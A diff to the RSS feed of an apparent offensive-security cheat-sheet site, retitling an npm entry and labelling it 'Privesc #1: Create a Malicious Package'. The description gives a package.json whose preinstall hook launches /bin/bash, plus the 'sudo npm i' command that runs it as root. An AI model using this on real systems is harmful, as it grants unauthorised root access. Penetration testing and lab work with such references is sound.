@@ -8,11 +8,11 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@nodejs/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>npm</title>
+      <title>Npm</title>
       <link>https://tldrbins.github.io/npm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/npm/</guid>
-      <description>SUDO Create a &amp;apos;package.json&amp;apos;&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
+      <description>Privesc #1: Create a Malicious Package Create a &amp;apos;package.json&amp;apos;&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
     </item>
   </channel>
 </rss>
